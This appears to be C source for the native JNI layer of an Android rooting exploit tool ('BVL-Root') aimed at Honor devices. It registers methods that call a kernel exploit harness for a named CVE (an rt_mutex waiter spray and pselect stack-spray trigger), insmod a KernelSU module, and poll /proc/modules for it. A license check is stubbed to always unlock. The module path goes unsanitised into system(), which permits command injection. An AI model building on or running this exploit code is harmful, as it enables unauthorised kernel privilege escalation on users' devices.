/* exp.c - BVL-Root JNI hub.
 *
 * CLEAN BUILD: no CVE-2026-43284 (DirtyFrag) code, no DirtyFrag assets,
 * no libcxx.S / splicehelper / asm_str shellcode. This project is the
 * CVE-2026-43499 (GhostLock / rt_mutex) + KernelSU line.
 *
 * CVE-2026-64560 (posix-cpu-timers UAF) is ARCHITECTURALLY DEAD on BVL
 * (H207: flush_signal_handlers / do_cpu_nanosleep / timer_settime are all
 * hard-bound to `current`, so there is no cross-process reachability). It is
 * removed from this tree entirely.
 *
 * Native methods (registered in JNI_OnLoad):
 *   n0  license unlock        (DEV stub — wire license_kit in phase 2)
 *   n1  direct KernelSU loader (insmod staged KO + poll /proc/modules)
 *   n7  CVE-2026-43499 harness (rt_mutex waiter + pselect stack-spray trigger)
 */

#include <jni.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

#include "reporter.h"
#include "bvl_config.h"

/* Provided by bvl_43499.c (CLEAN — CVE-2026-43499 rt_mutex / GhostLock). */
extern char *bvl43499_run(int duration_sec);

/* ------------------------------------------------------------------ */
/* n0: license unlock (DEV stub)                                      */
/* ------------------------------------------------------------------ */
static jboolean n0(JNIEnv *env, jclass clz __attribute__((unused)),
                   jobject reporter_obj,
                   jbyteArray lic, jbyteArray fp, jstring blobPath) {
    struct Reporter ro = {.env = env, .obj = reporter_obj}, *reporter = &ro;
    (void)lic; (void)fp; (void)blobPath;
    /* Phase 2: replace with real license_kit blob verification.
     * Dev build unlocks unconditionally so bring-up does not block. */
    REPORTLN("[lic] dev-unlocked (license gate stub)");
    return JNI_TRUE;
}

/* ------------------------------------------------------------------ */
/* n1: direct KernelSU loader                                         */
/* ------------------------------------------------------------------ */
static jint n1(JNIEnv *env, jclass clz __attribute__((unused)),
               jobject reporter_obj,
               jstring koTargetPath, jstring ksudPath,
               jboolean lateLoad) {
    struct Reporter ro = {.env = env, .obj = reporter_obj}, *reporter = &ro;

    const char *ko = (*env)->GetStringUTFChars(env, koTargetPath, NULL);
    if (!ko) { REPORTLN("[ksu] null KO path"); return 3; }
    const char *ksud = ksudPath ? (*env)->GetStringUTFChars(env, ksudPath, NULL) : NULL;

    /* 1) direct insmod of the staged KSU KO */
    char cmd[512];
    snprintf(cmd, sizeof cmd, "insmod %s", ko);
    REPORTLN("[ksu] %s", cmd);
    int rc = system(cmd);
    if (rc != 0) REPORTLN("[ksu] insmod rc=%d (vermagic mismatch?)", rc);

    /* 2) optional ksud supervisor bring-up */
    if (ksud && lateLoad) {
        snprintf(cmd, sizeof cmd, "%s late-load", ksud);
        REPORTLN("[ksu] %s", cmd);
        (void)system(cmd);
        snprintf(cmd, sizeof cmd, "%s manager", ksud);
        REPORTLN("[ksu] %s", cmd);
        (void)system(cmd);
    }

    /* 3) poll /proc/modules for the kernelsu marker */
    int verdict = 3;
    for (int elapsed = 0; elapsed < 60000; elapsed += 200) {
        usleep(200000);
        FILE *m = fopen("/proc/modules", "r");
        if (m) {
            char line[256];
            while (fgets(line, sizeof line, m)) {
                if (strstr(line, "kernelsu")) { verdict = 0; break; }
            }
            fclose(m);
        }
        if (verdict == 0) break;
    }
    REPORTLN("[ksu] verdict=%d", verdict);

    if (ko)   (*env)->ReleaseStringUTFChars(env, koTargetPath, ko);
    if (ksud) (*env)->ReleaseStringUTFChars(env, ksudPath, ksud);
    return verdict;
}

/* ------------------------------------------------------------------ */
/* n7: CVE-2026-43499 (GhostLock) harness — rt_mutex waiter spray     */
/*     trigger + pselect stack-spray canvas. The actual kernel R/W    */
/*     win primitive (slide / pipe / fops / CFI staging) is ported    */
/*     from the honor-BVL-AN16 reference in Phase 2.                   */
/* ------------------------------------------------------------------ */
static jstring n7(JNIEnv *env, jclass clz __attribute__((unused)),
                  jobject reporter_obj) {
    struct Reporter ro = {.env = env, .obj = reporter_obj}, *reporter = &ro;
    char *result = bvl43499_run(15);   /* 15s harness window */
    jstring ret = (*env)->NewStringUTF(env, result ? result : "43499 error");
    free(result);
    return ret;
}

/* ------------------------------------------------------------------ */
/* JNI_OnLoad                                                         */
/* ------------------------------------------------------------------ */
JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved __attribute__((unused))) {
    JNIEnv *env;
    if ((*vm)->GetEnv(vm, (void **)&env, JNI_VERSION_1_4) != JNI_OK)
        return JNI_ERR;

    jclass runner = (*env)->FindClass(env, "honor/root/ExploitRunner");
    if (!runner) return JNI_ERR;
    report_mid = (*env)->GetMethodID(env, runner, "report", "(Ljava/lang/String;)V");
    if (!report_mid) return JNI_ERR;

    JNINativeMethod methods[] = {
        {"n0", "([B[BLjava/lang/String;)Z", (void *)n0},
        {"n1", "(Ljava/lang/String;Ljava/lang/String;Z)I", (void *)n1},
        {"n7", "()Ljava/lang/String;", (void *)n7},
    };

    if ((*env)->RegisterNatives(env, runner, methods,
                                 sizeof(methods) / sizeof(methods[0])) != 0)
        return JNI_ERR;

    return JNI_VERSION_1_4;
}
